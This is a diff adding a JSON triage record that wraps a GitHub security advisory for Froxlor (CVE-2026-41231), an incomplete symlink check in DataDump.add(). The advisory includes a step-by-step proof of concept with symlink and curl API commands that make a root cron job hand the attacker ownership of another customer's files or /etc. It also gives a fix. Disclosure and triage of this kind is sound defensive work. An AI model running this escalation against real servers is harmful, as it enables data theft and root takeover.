@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/114768995?v=4\", \"events_url\": \"https://api.github.com/users/offset/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/offset/followers\", \"following_url\": \"https://api.github.com/users/offset/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/offset/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/offset\", \"id\": 114768995, \"login\": \"offset\", \"node_id\": \"U_kgDOBtc8Yw\", \"organizations_url\": \"https://api.github.com/users/offset/orgs\", \"received_events_url\": \"https://api.github.com/users/offset/received_events\", \"repos_url\": \"https://api.github.com/users/offset/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/offset/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/offset/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/offset\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-41231\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-59\", \"name\": \"Improper Link Resolution Before File Access ('Link Following')\"}], \"description\": \"## Summary\\n\\n`DataDump.add()` constructs the export destination path from user-supplied input without passing the `$fixed_homedir` parameter to `FileDir::makeCorrectDir()`, bypassing the symlink validation that was added to all other customer-facing path operations (likely as the fix for CVE-2023-6069). When the ExportCron runs as root, it executes `chown -R` on the resolved symlink target, allowing a customer to take ownership of arbitrary directories on the system.\\n\\n## Details\\n\\nThe vulnerability is an incomplete patch. After CVE-2023-6069, symlink validation was added to `FileDir::makeCorrectDir()` via a `$fixed_homedir` parameter. When provided, it walks each path component checking for symlinks that escape the customer's home directory (lines 134-157 of `lib/Froxlor/FileDir.php`).\\n\\nEvery customer-facing API command that builds a path from user input passes this parameter:\\n\\n```php\\n// DirProtections.php:87\\n$path = FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path, $customer['documentroot']);\\n\\n// DirOptions.php:96\\n$path = FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path, $customer['documentroot']);\\n\\n// Ftps.php:178\\n$path = FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path, $customer['documentroot']);\\n\\n// SubDomains.php:585\\nreturn FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path, $customer['documentroot']);\\n```\\n\\nBut `DataDump.add()` was missed:\\n\\n```php\\n// DataDump.php:88 — NO $fixed_homedir parameter\\n$path = FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path);\\n```\\n\\nThe path flows unvalidated into a cron task (`lib/Froxlor/Api/Commands/DataDump.php:133`):\\n\\n```php\\nCronjob::inserttask(TaskId::CREATE_CUSTOMER_DATADUMP, $task_data);\\n```\\n\\nWhen `ExportCron::handle()` runs as root, it executes at `lib/Froxlor/Cron/System/ExportCron.php:232`:\\n\\n```php\\nFileDir::safe_exec('chown -R ' . (int)$data['uid'] . ':' . (int)$data['gid'] . ' ' . escapeshellarg($data['destdir']));\\n```\\n\\nThe `chown -R` command follows symlinks in its target argument. If `$data['destdir']` resolves through a symlink to an arbitrary directory, the attacker's UID/GID is applied recursively to that directory and all its contents.\\n\\nThe `Validate::validate()` call on line 86 uses an empty pattern, which falls back to `/^[^\\\\r\\\\n\\\\t\\\\f\\\\0]*$/D` — this only strips control characters and does not prevent symlink names. `makeSecurePath()` strips shell metacharacters and `..` traversal but does not check for symlinks.\\n\\n## PoC\\n\\nPrerequisites:\\n- `system.exportenabled` = 1 (admin setting)\\n- Customer account with API key and FTP/SSH access\\n\\n```bash\\n# Step 1: Create a symlink inside the customer's docroot pointing to a victim directory\\n# (customer has FTP/SSH access to their own docroot)\\nssh customer@server 'ln -s /var/customers/webs/victim_customer /var/customers/webs/attacker_customer/steal'\\n\\n# Step 2: Schedule data export via API with path pointing to the symlink\\ncurl -X POST \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"header\\\":{\\\"apikey\\\":\\\"CUSTOMER_API_KEY\\\",\\\"secret\\\":\\\"CUSTOMER_API_SECRET\\\"},\\\"body\\\":{\\\"command\\\":\\\"DataDump.add\\\",\\\"params\\\":{\\\"path\\\":\\\"steal\\\",\\\"dump_web\\\":\\\"1\\\"}}}' \\\\\\n  https://panel.example.com/api.php\\n\\n# Expected response: 200 OK with task_data including destdir\\n\\n# Step 3: Wait for ExportCron to run (hourly cron as root)\\n# The cron executes:\\n#   mkdir -p '/var/customers/webs/attacker_customer/steal/'       (follows symlink, dir exists)\\n#   tar cfz ... -C /var/customers/webs/attacker_customer/ .       (tars attacker's web data)\\n#   chown -R <attacker_uid>:<attacker_gid> '/var/customers/webs/attacker_customer/steal/.tmp/'\\n#   mv export.tar.gz '/var/customers/webs/attacker_customer/steal/'\\n#   chown -R <attacker_uid>:<attacker_gid> '/var/customers/webs/attacker_customer/steal/'\\n#\\n# The final chown resolves the symlink and recursively chowns\\n# /var/customers/webs/victim_customer/ to the attacker's UID/GID.\\n\\n# Step 4: Attacker now owns all of victim's web files\\nssh customer@server 'ls -la /var/customers/webs/victim_customer/'\\n# All files now owned by attacker_customer UID\\n\\n# For system-level escalation, the symlink can target /etc:\\n# ln -s /etc /var/customers/webs/attacker_customer/steal\\n# After cron: attacker owns /etc/passwd, /etc/shadow → root shell\\n```\\n\\n## Impact\\n\\n- **Horizontal privilege escalation:** A customer can take ownership of any other customer's web files, databases exports, and email data on the same server.\\n- **Vertical privilege escalation:** By targeting system directories (e.g., `/etc`), the customer can gain read/write access to `/etc/passwd` and `/etc/shadow`, enabling creation of a root account or password modification.\\n- **Data breach:** Full read access to all files in the targeted directory tree, including configuration files with database credentials, application secrets, and user data.\\n- **Service disruption:** Changing ownership of system directories can break system services.\\n\\nThe attack requires only a single API call and a symlink. The impact is delayed until the next cron run (typically hourly), making it harder to attribute.\\n\\n## Recommended Fix\\n\\nPass `$customer['documentroot']` as the `$fixed_homedir` parameter in `DataDump.add()`, consistent with every other API command:\\n\\n```php\\n// lib/Froxlor/Api/Commands/DataDump.php, line 88\\n// Before (vulnerable):\\n$path = FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path);\\n\\n// After (fixed):\\n$path = FileDir::makeCorrectDir($customer['documentroot'] . '/' . $path, $customer['documentroot']);\\n```\\n\\nAdditionally, the `ExportCron` should use `chown -h` (no-dereference) or validate the destination path is not a symlink before executing `chown -R`:\\n\\n```php\\n// lib/Froxlor/Cron/System/ExportCron.php, line 232\\n// Add symlink check before chown\\nif (is_link(rtrim($data['destdir'], '/'))) {\\n    $cronlog->logAction(FroxlorLogger::CRON_ACTION, LOG_ERR, 'Export destination is a symlink, skipping chown for security: ' . $data['destdir']);\\n} else {\\n    FileDir::safe_exec('chown -R ' . (int)$data['uid'] . ':' . (int)$data['gid'] . ' ' . escapeshellarg($data['destdir']));\\n}\\n```\", \"epss\": {\"percentage\": 0.00414, \"percentile\": 0.33529}, \"ghsa_id\": \"GHSA-75h4-c557-j89r\", \"github_reviewed_at\": \"2026-04-16T00:47:18Z\", \"html_url\": \"https://github.com/advisories/GHSA-75h4-c557-j89r\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-75h4-c557-j89r\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-41231\"}], \"nvd_published_at\": \"2026-04-23T04:16:19Z\", \"published_at\": \"2026-04-16T00:47:18Z\", \"references\": [\"https://github.com/froxlor/froxlor/security/advisories/GHSA-75h4-c557-j89r\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-41231\", \"https://github.com/froxlor/froxlor/commit/2987b0e8806ef12b532410050ad76d13d673a87d\", \"https://github.com/froxlor/froxlor/releases/tag/2.3.6\", \"https://github.com/advisories/GHSA-75h4-c557-j89r\"], \"repository_advisory_url\": \"https://api.github.com/repos/froxlor/froxlor/security-advisories/GHSA-75h4-c557-j89r\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/froxlor/froxlor\", \"summary\": \"Froxlor has Incomplete Symlink Validation in DataDump.add() Allows Arbitrary Directory Ownership Takeover via Cron\", \"type\": \"reviewed\", \"updated_at\": \"2026-04-24T20:54:09Z\", \"url\": \"https://api.github.com/advisories/GHSA-75h4-c557-j89r\", \"vulnerabilities\": [{\"first_patched_version\": \"2.3.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"froxlor/froxlor\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.3.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-75h4-c557-j89r",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "froxlor/froxlor: < 2.3.6"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2023-6069",
+      "CVE-2026-41231"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "froxlor/froxlor"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.662737Z",
+  "provenance": {
+    "content_sha256": "ac9c5bee86a5291bb9c76095f5059231244b79e41f04690a88e05ca6ac645b4e",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-16T00:47:18Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-75h4-c557-j89r",
+  "status": "active",
+  "title": "Froxlor has Incomplete Symlink Validation in DataDump.add() Allows Arbitrary Directory Ownership Takeover via Cron",
+  "updated_at": "2026-04-24T20:54:09Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-75h4-c557-j89r"
+}
